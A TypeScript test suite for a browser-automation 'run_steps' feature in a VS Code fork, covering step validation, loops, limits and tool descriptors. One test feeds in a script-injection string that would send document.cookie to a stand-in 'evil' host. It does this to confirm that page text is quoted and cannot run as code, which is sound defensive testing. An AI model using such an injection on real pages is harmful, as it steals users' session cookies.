/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// PARA-CODE: fork-owned file (Para Code) — not present in upstream microsoft/vscode. See CLAUDE.md.

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { paradisRunSteps } from '../../node/paradisBrowserRunSteps.js';
import { PARADIS_RUN_STEPS_FLOW_MAX_EXECUTED, paradisParseRunStepsFlow, paradisRunStepsFlow, paradisRunStepsFlowDescriptor, paradisRunStepsReference } from '../../node/paradisBrowserRunStepsFlow.js';

function text(value: string, isError = false): unknown {
	return { content: [{ type: 'text', text: value }], ...(isError ? { isError: true } : {}) };
}

function textOf(result: unknown): string {
	return ((result as { content: { text?: string }[] }).content).map(item => item.text ?? '').join('\n');
}

/** 道具の呼び出しを記録し、`answer` で答える偽のサービス。時計は sleep の分だけ進む。 */
function fakeCall(answer: (name: string, args: Record<string, unknown>) => unknown) {
	const calls: string[] = [];
	let clock = 0;
	return {
		calls,
		call: {
			callTool: async (name: string, args: Record<string, unknown>) => {
				calls.push(`${name} ${JSON.stringify(args)}`);
				return answer(name, args);
			},
			now: () => clock,
			sleep: async (ms: number) => { clock += ms; },
		},
		advance: (ms: number) => { clock += ms; },
	};
}

const GET_TEXT_ALL = 'match(es)\nShowing characters 0-40 of 40 (end).\n\n[0] a "Order A-1"\nA-1\n\n[1] a "Order B-2"\nB-2';

suite('Paradis run_steps flow (E6)', () => {
	ensureNoDisposablesAreLeakedInTestSuite();

	test('the steps are checked before anything runs, and the plain run_steps still refuses the new step kinds', async () => {
		assert.deepStrictEqual({
			unknownKey: paradisParseRunStepsFlow({ steps: [{ expect: { text: 'x', colour: 'red' } }] }),
			twoConditions: paradisParseRunStepsFlow({ steps: [{ expect: { text: 'x', text_gone: 'y' } }] }),
			badLocator: paradisParseRunStepsFlow({ steps: [{ repeat_until: { disabled: 'Next' }, steps: [{ tool: 'click_by', args: {} }] }] }),
			deepLoop: paradisParseRunStepsFlow({ steps: [{ for_each: ['a'], steps: [{ for_each: ['b'], steps: [{ for_each: ['c'], steps: [{ sleep_ms: 1 }] }] }] }] }),
			notAllowed: paradisParseRunStepsFlow({ steps: [{ tool: 'open_browser_tab', args: {} }] }),
			plain: textOf(await paradisRunSteps({ callTool: async () => text('ok') }, { steps: [{ expect: { text: 'x' } }] })),
		}, {
			unknownKey: { ok: false, error: '"steps" step 1 "expect" must have exactly one of: text, text_gone, url_includes, predicate, visible, gone, disabled, enabled (unknown: colour).' },
			twoConditions: { ok: false, error: '"steps" step 1 "expect" must have exactly one of: text, text_gone, url_includes, predicate, visible, gone, disabled, enabled.' },
			badLocator: { ok: false, error: '"steps" step 1 "repeat_until": "disabled" must be a locator such as {"role": "button", "name": "Next"} or {"selector": "..."} (keys: selector, role, name, text, exact).' },
			deepLoop: { ok: false, error: '"steps" step 1 "steps" step 1 "steps" step 1: loops can be nested only 2 deep.' },
			notAllowed: { ok: false, error: '"steps" step 1: "open_browser_tab" cannot be used in run_steps. Allowed: navigate_page, click, click_at, fill, fill_form, hover, press_key, type_text, drag, handle_dialog, wait_for, take_screenshot, take_snapshot, evaluate_script, list_console_messages, list_network_requests, click_by, fill_by, wait_until, get_text, inspect_element, scroll_to, capture_screenshot, mouse_action, highlight_element.' },
			plain: 'Step 1 must be {"tool": "...", "args": {...}}.',
		});
	});

	test('get_text with all: true gives one item per match, and for_each passes each item and index to its steps', async () => {
		const fake = fakeCall(name => name === 'get_text' ? text(GET_TEXT_ALL) : text('done'));
		const result = await paradisRunStepsFlow(fake.call, {
			steps: [
				{ tool: 'get_text', args: { selector: 'td a', all: true } },
				{ for_each: '$1.items', steps: [{ tool: 'click_by', args: { role: 'link', name: 'Order $item' } }, { tool: 'get_text', args: { selector: '.row-$index' } }] },
				{ tool: 'fill_by', args: { name: 'Note', value: 'Read: $1.items ($$5)' } },
			],
		});
		assert.deepStrictEqual({
			reference: paradisRunStepsReference('get_text', text(GET_TEXT_ALL)),
			calls: fake.calls,
			summary: textOf(result).split('\n')[0],
		}, {
			reference: { text: 'A-1\nB-2', items: ['A-1', 'B-2'] },
			calls: [
				'get_text {"selector":"td a","all":true}',
				'click_by {"role":"link","name":"Order A-1"}',
				'get_text {"selector":".row-0"}',
				'click_by {"role":"link","name":"Order B-2"}',
				'get_text {"selector":".row-1"}',
				'fill_by {"name":"Note","value":"Read: A-1, B-2 ($5)"}',
			],
			summary: 'run_steps: 6 step(s) executed, 0 failed.',
		});
	});

	test('expect waits with wait_until and stops the run when it is not met, unless continue_on_error', async () => {
		const answer = (name: string, args: Record<string, unknown>) => name === 'wait_until' && args.text === 'Saved' ? text('Timed out after 2 s.', true) : text('ok');
		const stopped = fakeCall(answer);
		const stoppedResult = await paradisRunStepsFlow(stopped.call, { steps: [{ tool: 'click_by', args: { name: 'Save' } }, { expect: { text: 'Saved', timeout_ms: 2000 } }, { tool: 'click_by', args: { name: 'Next' } }] }) as { isError?: boolean };
		const continued = fakeCall(answer);
		await paradisRunStepsFlow(continued.call, { continue_on_error: true, steps: [{ expect: { text: 'Saved', timeout_ms: 2000 } }, { expect: { url_includes: '/done' } }, { expect: { gone: { selector: '.spinner' } } }] });
		assert.deepStrictEqual({ stopped: stopped.calls, isError: stoppedResult.isError, continued: continued.calls }, {
			stopped: ['click_by {"name":"Save"}', 'wait_until {"timeout_seconds":2,"text":"Saved","state":"visible"}'],
			isError: true,
			continued: [
				'wait_until {"timeout_seconds":2,"text":"Saved","state":"visible"}',
				'wait_until {"timeout_seconds":5,"predicate":"() => location.href.includes(\\"/done\\")"}',
				'wait_until {"timeout_seconds":5,"selector":".spinner","state":"hidden"}',
			],
		});
	});

	test('repeat_until checks its condition before each round, so a single page is read once and never paged', async () => {
		let pages = 3;
		const paging = fakeCall(name => {
			if (name === 'inspect_element') {
				return text(JSON.stringify({ matched: 1, visible: true, enabled: pages > 1 }));
			}
			if (name === 'click_by') {
				pages--;
			}
			return text('ok');
		});
		const result = await paradisRunStepsFlow(paging.call, { steps: [{ repeat_until: { disabled: { role: 'button', name: 'Next' } }, steps: [{ tool: 'get_text', args: { selector: 'tr', all: true } }, { tool: 'click_by', args: { role: 'button', name: 'Next' } }] }] });
		const single = fakeCall(name => name === 'inspect_element' ? text('No element matches role "button", name "Next".', true) : text('ok'));
		await paradisRunStepsFlow(single.call, { steps: [{ repeat_until: { disabled: { role: 'button', name: 'Next' } }, steps: [{ tool: 'click_by', args: { name: 'Next' } }] }] });
		assert.deepStrictEqual({ paged: paging.calls.filter(call => call.startsWith('click_by')).length, last: textOf(result).includes('repeat_until disabled {"role":"button","name":"Next"} ok\nMet after 2 round(s).'), single: single.calls }, {
			paged: 2,
			last: true,
			single: ['inspect_element {"role":"button","name":"Next"}'],
		});
	});

	test('the run stops at the step limit, at the time limit, and on an unknown reference', async () => {
		const many = fakeCall(() => text('ok'));
		const limited = await paradisRunStepsFlow(many.call, { steps: [{ for_each: Array.from({ length: 100 }, (_, i) => String(i)), max: 100, steps: [{ tool: 'click', args: {} }, { tool: 'click', args: {} }, { tool: 'click', args: {} }] }] });
		const slow = fakeCall(() => text('ok'));
		const timed = await paradisRunStepsFlow(slow.call, { max_seconds: 5, steps: [{ sleep_ms: 4000 }, { sleep_ms: 4000 }, { tool: 'click', args: {} }] });
		const unknown = fakeCall(() => text('ok'));
		const missing = await paradisRunStepsFlow(unknown.call, { steps: [{ tool: 'fill_by', args: { value: '$4.text' } }] });
		assert.deepStrictEqual({
			limited: [many.calls.length, textOf(limited).split('\n')[0]],
			timed: [slow.calls.length, textOf(timed).split('\n')[0]],
			missing: [unknown.calls.length, textOf(missing).includes('Unknown reference: $4.text.')],
		}, {
			limited: [PARADIS_RUN_STEPS_FLOW_MAX_EXECUTED, `run_steps: ${PARADIS_RUN_STEPS_FLOW_MAX_EXECUTED} step(s) executed, 0 failed. run_steps stopped after ${PARADIS_RUN_STEPS_FLOW_MAX_EXECUTED} executed steps (the limit).`],
			timed: [0, 'run_steps: 2 step(s) executed, 0 failed. run_steps stopped at its time limit (max_seconds).'],
			missing: [0, true],
		});
	});

	test('only run_steps gets the script description and schema', () => {
		const runSteps = paradisRunStepsFlowDescriptor({ name: 'run_steps', description: 'old', inputSchema: { type: 'object', properties: {} } });
		const other = { name: 'click_by', description: 'old' };
		assert.deepStrictEqual({
			properties: Object.keys((runSteps.inputSchema as { properties: object }).properties),
			mentions: ['expect', 'for_each', 'repeat_until', '$2.text'].every(word => runSteps.description?.includes(word)),
			other: paradisRunStepsFlowDescriptor(other) === other,
		}, { properties: ['steps', 'continue_on_error', 'max_seconds'], mentions: true, other: true });
	});
	test('a reference inside a script is inserted as a quoted string value, so text from a page cannot run as code', async () => {
		const hostile = `')||fetch('//evil?'+document.cookie)||('`;
		const fake = fakeCall(name => name === 'get_text' ? text(`Text of the whole page.\nShowing characters 0-40 of 40 (end).\n\n${hostile}`) : text('ok'));
		await paradisRunStepsFlow(fake.call, {
			steps: [
				{ tool: 'get_text', args: {} },
				{ tool: 'evaluate_script', args: { function: '() => document.title.includes($1.text)' } },
				{ tool: 'wait_until', args: { predicate: '() => document.body.innerText.includes($1.text)' } },
				{ expect: { predicate: '() => location.hash === $1.text', timeout_ms: 1000 } },
				{ tool: 'navigate_page', args: { url: 'about:blank', initScript: 'window.lastTitle = $1.text;' } },
				{ tool: 'fill_by', args: { name: 'Search', value: '$1.text' } },
			],
		});
		const quoted = JSON.stringify(hostile);
		assert.deepStrictEqual(fake.calls.slice(1).map(call => JSON.parse(call.slice(call.indexOf(' ') + 1))), [
			{ function: `() => document.title.includes(${quoted})` },
			{ predicate: `() => document.body.innerText.includes(${quoted})`, timeout_seconds: 10 },
			{ timeout_seconds: 1, predicate: `() => location.hash === ${quoted}` },
			{ url: 'about:blank', initScript: `window.lastTitle = ${quoted};` },
			{ name: 'Search', value: hostile },
		]);
	});

	test('waits inside a step are cut to the time left in the run', async () => {
		const fake = fakeCall(() => text('ok'));
		await paradisRunStepsFlow(fake.call, { max_seconds: 5, steps: [{ sleep_ms: 3000 }, { tool: 'wait_until', args: { text: 'Done', timeout_seconds: 60 } }, { tool: 'wait_for', args: { text: ['Done'], timeout: 60000 } }] });
		assert.deepStrictEqual(fake.calls, ['wait_until {"text":"Done","timeout_seconds":2}', 'wait_for {"text":["Done"],"timeout":2000}']);
	});

});
